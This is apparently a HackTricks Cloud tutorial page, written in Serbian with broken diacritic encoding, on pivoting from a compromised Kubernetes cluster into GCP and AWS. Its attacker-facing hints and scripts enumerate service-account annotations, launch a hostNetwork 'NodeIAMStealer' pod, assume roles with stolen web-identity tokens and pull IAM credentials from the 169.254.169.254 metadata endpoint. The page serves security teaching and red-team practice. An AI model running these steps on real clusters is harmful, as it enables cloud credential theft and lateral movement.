# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stru캜njak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stru캜njak (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## GCP

Ako pokre캖ete k8s klaster unutar GCP-a, verovatno 캖ete 쬰leti da neka aplikacija koja se izvr코ava unutar klastera ima pristup GCP-u. Postoje 2 uobi캜ajena na캜ina za to:

### Montiranje GCP-SA klju캜eva kao tajne

Uobi캜ajeni na캜in davanja **pristupa kubernetes aplikaciji GCP-u** je:

* Kreirati GCP Servisni Nalog
* Dodeliti mu 쬰ljene dozvole
* Preuzeti json klju캜 kreiranog SA
* Montirati ga kao tajnu unutar poda
* Postaviti GOOGLE\_APPLICATION\_CREDENTIALS promenljivu okru쬰nja koja pokazuje putanju gde se nalazi json.

{% hint style="warning" %}
Stoga, kao **napada캜**, ako kompromitujete kontejner unutar poda, trebalo bi da proverite tu **env** **promenljivu** i **json** **fajlove** sa GCP kredencijalima.
{% endhint %}

### Povezivanje GSA json sa KSA tajnom

Na캜in davanja pristupa GSA GKE klasteru je povezivanjem na slede캖i na캜in:

* Kreirajte Kubernetes servisni nalog u istom namespace-u kao va코 GKE klaster koriste캖i slede캖u komandu:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Napravite Kubernetes tajnu koja sadr쬴 podatke za prijavljivanje na GCP servisni nalog kojem 쬰lite dati pristup GKE klasteru. To mo쬰te uraditi koriste캖i `gcloud` alat komandne linije, kao 코to je prikazano u slede캖em primeru:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Pove쬴te Kubernetes tajnu sa Kubernetes servisnim nalogom koriste캖i slede캖u komandu:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
U **drugom koraku** postavljene su **poverljive informacije GSA kao tajna KSA**. Zatim, ako mo쬰te **pro캜itati tu tajnu** iz **unutra코njosti** **GKE** klastera, mo쬰te **pre캖i na taj GCP servisni nalog**.
{% endhint %}

### GKE Identitet Radnog Optere캖enja

Sa Identitetom Radnog Optere캖enja, mo쬰mo konfigurisati [servisni nalog Kubernetes-a](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) da deluje kao [Google servisni nalog](https://cloud.google.com/iam/docs/understanding-service-accounts). Podovi koji se izvr코avaju sa servisnim nalogom Kubernetes-a automatski 캖e se autentikovati kao Google servisni nalog prilikom pristupa Google Cloud API-jima.

**Prva serija koraka** za omogu캖avanje ovog pona코anja je da **omogu캖ite Identitet Radnog Optere캖enja u GCP-u** ([**koraci**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) i kreirate GCP SA koji 쬰lite da k8s predstavlja.

* **Omogu캖ite Identitet Radnog Optere캖enja** na novom klasteru

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Kreiraj/A쬿riraj novi nodepool** (Autopilot klasteri ne zahtevaju ovo)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Napravite **GCP servisni nalog za impersonaciju** iz K8s sa GCP dozvolama:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Pove쬴te** se sa **klasterom** i **napravite** nalog za **servis** koji 캖e se koristiti

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Pove쬴te GSA sa KSA** 

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Pokrenite **pod** sa **KSA** i proverite **pristup** **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Proverite slede캖u komandu za autentifikaciju ako je potrebno:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Kao napada캜 unutar K8s trebalo bi da **tra쬴te SAs** sa **`iam.gke.io/gcp-service-account` anotacijom** jer to ukazuje da SA mo쬰 pristupiti ne캜emu u GCP-u. Druga opcija bila bi poku코ati zloupotrebiti svaki KSA u klasteru i proveriti da li ima pristup.\
Sa GCP-a je uvek interesantno enumerisati veze i znati **koji pristup dajete SAs unutar Kubernetesa**.
{% endhint %}

Ovo je skripta za **lako iteriranje kroz sve definicije podova** u potrazi za tom **anotacijom**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM uloga za Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Jedan (zastareo) na캜in davanja IAM uloga Pods-ovima je kori코캖enjem [**Kiam**](https://github.com/uswitch/kiam) ili [**Kube2IAM**](https://github.com/jtblin/kube2iam) **servera**. U osnovi, mora캖ete pokrenuti **daemonset** u svom klasteru sa **vrstom privilegovane IAM uloge**. Ovaj daemonset 캖e biti taj koji 캖e omogu캖iti pristup IAM ulogama pods-ovima koji to zahtevaju.

Prvo 코to treba da uradite je da konfiguri코ete **koje uloge mogu biti pristupljene unutar namespace-a**, i to radite sa anotacijom unutar objekta namespace-a:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Kada je namespace konfigurisan sa IAM ulogama koje Podovi mogu imati, mo쬰te **nazna캜iti ulogu koju 쬰lite na svakoj definiciji poda ne캜im sli캜nim**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Kao napada캜, ako **prona캠ete ove anotacije** u podovima ili imenskim prostorima ili ako se izvr코ava server kiam/kube2iam (verovatno u kube-sistemu), mo쬰te **preuzeti identitet svake** uloge koja je ve캖 **kori코캖ena od strane podova** i vi코e (ako imate pristup AWS nalogu, nabrojite uloge).
{% endhint %}

#### Kreirajte Pod sa IAM ulogom

{% hint style="info" %}
IAM uloga koja se navodi mora biti u istom AWS nalogu kao i uloga kiam/kube2iam i ta uloga mora mo캖i da joj pristupi.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM uloga za K8s servisne naloge putem OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Ovo je **preporu캜eni na캜in od strane AWS-a**.

1. Prvo treba [kreirati OIDC provajdera za klaster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Zatim kreirate IAM ulogu sa dozvolama koje 캖e SN zahtevati.
3. Kreirajte [povereni캜ki odnos izme캠u IAM uloge i SN](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) naziv (ili namespace koji daje pristup ulozi svim SN-ovima u namespace-u). _Povereni캜ki odnos 캖e uglavnom proveriti ime OIDC provajdera, ime namespace-a i ime SN-a_.
4. Na kraju, **kreirajte SN sa anotacijom koja pokazuje ARN uloge**, i podovi koji se izvr코avaju sa tim SN-om 캖e imati **pristup token-u uloge**. **Token** je **upisan** u datoteku i putanja je navedena u **`AWS_WEB_IDENTITY_TOKEN_FILE`** (podrazumevano: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Da biste **dobili aws koriste캖i token** sa `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` pokrenite:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Kao napada캜, ako mo쬰te da nabrojite K8s klaster, proverite **servisne naloge sa tom anotacijom** da biste **pre코li na AWS**. Da biste to uradili, jednostavno **izvr코ite/kreirate** pod koriste캖i jedan od IAM **privilegovanih servisnih naloga** i ukradite token.

Osim toga, ako ste unutar poda, proverite env promenljive poput **AWS\_ROLE\_ARN** i **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
Ponekad **Povereni캜ka politika uloge** mo쬰 biti **lo코e konfigurisana** i umesto davanja pristupa AssumeRole o캜ekivanom servisnom nalogu, daje ga **svim servisnim nalozima**. Stoga, ako ste u mogu캖nosti da napi코ete anotaciju na kontrolisanom servisnom nalogu, mo쬰te pristupiti ulozi.

Proverite **slede캖u stranicu za vi코e informacija**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Pronala쬰nje Podova i SA sa IAM Ulogama u Klasteru

Ovo je skripta za jednostavno **iteriranje kroz sve podove i definicije sa** servisnim nalozima **tra쬰캖i** tu **anotaciju**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM uloga

Prethodni odeljak je bio o tome kako ukrasti IAM uloge sa podovima, ali imajte na umu da je **Node** K8s klastera **instanca unutar oblaka**. To zna캜i da je Node vrlo verovatno da 캖e **imati novu IAM ulogu koju mo쬰te ukrasti** (_imajte na umu da obi캜no svi 캜vorovi K8s klastera imaju istu IAM ulogu, pa mo쬯a ne캖e biti vredno proveravati svaki 캜vor_).

Me캠utim, postoji va쬬n zahtev za pristup ta캜ki metapodataka sa 캜vora, morate biti na 캜voru (ssh sesija?) ili barem imati istu mre쬿:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Ukradi IAM Role Token

Ranije smo diskutovali kako **dodati IAM uloge kontejnerima** ili 캜ak kako **pobegnuti do Node-a da ukrademo IAM ulogu** koju je instanca pridru쬴la.

Mo쬰te koristiti slede캖i skript da **ukradete** svoje novo te코ko ste캜ene **IAM uloge podataka**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Reference

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
U캜ite i ve쬭ajte hakovanje AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
U캜ite i ve쬭ajte hakovanje GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
